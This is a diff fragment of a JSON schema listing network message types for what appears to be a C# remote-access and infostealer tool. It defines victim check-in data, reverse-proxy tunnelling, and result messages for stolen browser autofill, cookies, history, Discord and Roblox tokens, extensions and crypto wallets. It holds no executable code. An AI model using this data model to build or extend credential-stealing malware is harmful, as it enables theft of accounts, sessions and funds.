+  "name": "NetHello",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Version"
+   },
+   {
+    "type": "string",
+    "name": "OperatingSystem"
+   },
+   {
+    "type": "string",
+    "name": "AccountType"
+   },
+   {
+    "type": "string",
+    "name": "Country"
+   },
+   {
+    "type": "string",
+    "name": "CountryCode"
+   },
+   {
+    "type": "int",
+    "name": "ImageIndex"
+   },
+   {
+    "type": "string",
+    "name": "Id"
+   },
+   {
+    "type": "string",
+    "name": "Username"
+   },
+   {
+    "type": "string",
+    "name": "PcName"
+   },
+   {
+    "type": "string",
+    "name": "Tag"
+   },
+   {
+    "type": "string",
+    "name": "EncryptionKey"
+   },
+   {
+    "type": "byte[]",
+    "name": "Signature"
+   },
+   {
+    "type": "int",
+    "name": "MonitorCount"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4,
+   5,
+   6,
+   7,
+   8,
+   9,
+   10,
+   11,
+   12,
+   13
+  ],
+  "file": "NetHello.cs"
+ },
+ {
+  "name": "NetHelloAck",
+  "fields": [
+   {
+    "type": "bool",
+    "name": "Result"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "NetHelloAck.cs"
+ },
+ {
+  "name": "ReverseProxyData",
+  "fields": [
+   {
+    "type": "int",
+    "name": "ConnectionId"
+   },
+   {
+    "type": "byte[]",
+    "name": "Data"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "ReverseProxyData.cs"
+ },
+ {
+  "name": "ReverseProxyStart",
+  "fields": [
+   {
+    "type": "int",
+    "name": "ConnectionId"
+   },
+   {
+    "type": "string",
+    "name": "Target"
+   },
+   {
+    "type": "int",
+    "name": "Port"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3
+  ],
+  "file": "ReverseProxyStart.cs"
+ },
+ {
+  "name": "ReverseProxyStop",
+  "fields": [
+   {
+    "type": "int",
+    "name": "ConnectionId"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "ReverseProxyStop.cs"
+ },
+ {
+  "name": "ReverseProxyTunnelReady",
+  "fields": [
+   {
+    "type": "int",
+    "name": "ConnectionId"
+   },
+   {
+    "type": "int",
+    "name": "LocalPort"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "ReverseProxyTunnelReady.cs"
+ },
+ {
+  "name": "SetClipboard",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Content"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "SetClipboard.cs"
+ },
+ {
+  "name": "SetStatus",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Message"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "SetStatus.cs"
+ },
+ {
+  "name": "SetStatusFileManager",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Message"
+   },
+   {
+    "type": "bool",
+    "name": "SetLastDirectorySeen"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "SetStatusFileManager.cs"
+ },
+ {
+  "name": "SetUserStatus",
+  "fields": [
+   {
+    "type": "bool",
+    "name": "IsActive"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "SetUserStatus.cs"
+ },
+ {
+  "name": "StealAutofillEntry",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Browser"
+   },
+   {
+    "type": "string",
+    "name": "Name"
+   },
+   {
+    "type": "string",
+    "name": "Value"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3
+  ],
+  "file": "StealAutofillEntry.cs"
+ },
+ {
+  "name": "StealAutofillResult",
+  "fields": [
+   {
+    "type": "List<StealAutofillEntry>",
+    "name": "Entries"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "StealAutofillResult.cs"
+ },
+ {
+  "name": "StealCookieFile",
+  "fields": [
+   {
+    "type": "string",
+    "name": "FileName"
+   },
+   {
+    "type": "string",
+    "name": "Content"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "StealCookieFile.cs"
+ },
+ {
+  "name": "StealCookiesResult",
+  "fields": [
+   {
+    "type": "List<StealCookieFile>",
+    "name": "Files"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "StealCookiesResult.cs"
+ },
+ {
+  "name": "StealDiscordResult",
+  "fields": [
+   {
+    "type": "List<StealDiscordToken>",
+    "name": "Tokens"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "StealDiscordResult.cs"
+ },
+ {
+  "name": "StealDiscordToken",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Token"
+   },
+   {
+    "type": "string",
+    "name": "Username"
+   },
+   {
+    "type": "string",
+    "name": "Email"
+   },
+   {
+    "type": "string",
+    "name": "Phone"
+   },
+   {
+    "type": "bool",
+    "name": "HasNitro"
+   },
+   {
+    "type": "string",
+    "name": "UserId"
+   },
+   {
+    "type": "bool",
+    "name": "Mfa"
+   },
+   {
+    "type": "bool",
+    "name": "Verified"
+   },
+   {
+    "type": "string",
+    "name": "NitroType"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3,
+   4,
+   5,
+   6,
+   7,
+   8,
+   9
+  ],
+  "file": "StealDiscordToken.cs"
+ },
+ {
+  "name": "StealExtensionsResult",
+  "fields": [
+   {
+    "type": "byte[]",
+    "name": "ZipData"
+   },
+   {
+    "type": "int",
+    "name": "Count"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "StealExtensionsResult.cs"
+ },
+ {
+  "name": "StealHistoryFile",
+  "fields": [
+   {
+    "type": "string",
+    "name": "FileName"
+   },
+   {
+    "type": "string",
+    "name": "Content"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "StealHistoryFile.cs"
+ },
+ {
+  "name": "StealHistoryResult",
+  "fields": [
+   {
+    "type": "List<StealHistoryFile>",
+    "name": "Files"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "StealHistoryResult.cs"
+ },
+ {
+  "name": "StealRobloxResult",
+  "fields": [
+   {
+    "type": "List<StealRobloxToken>",
+    "name": "Tokens"
+   }
+  ],
+  "members": [
+   1
+  ],
+  "file": "StealRobloxResult.cs"
+ },
+ {
+  "name": "StealRobloxToken",
+  "fields": [
+   {
+    "type": "string",
+    "name": "Browser"
+   },
+   {
+    "type": "string",
+    "name": "Cookie"
+   },
+   {
+    "type": "string",
+    "name": "Profile"
+   }
+  ],
+  "members": [
+   1,
+   2,
+   3
+  ],
+  "file": "StealRobloxToken.cs"
+ },
+ {
+  "name": "StealWalletsResult",
+  "fields": [
+   {
+    "type": "byte[]",
+    "name": "ZipData"
+   },
+   {
+    "type": "int",
+    "name": "Count"
+   }
+  ],
+  "members": [
+   1,
+   2
+  ],
+  "file": "StealWalletsResult.cs"
+ }
+]
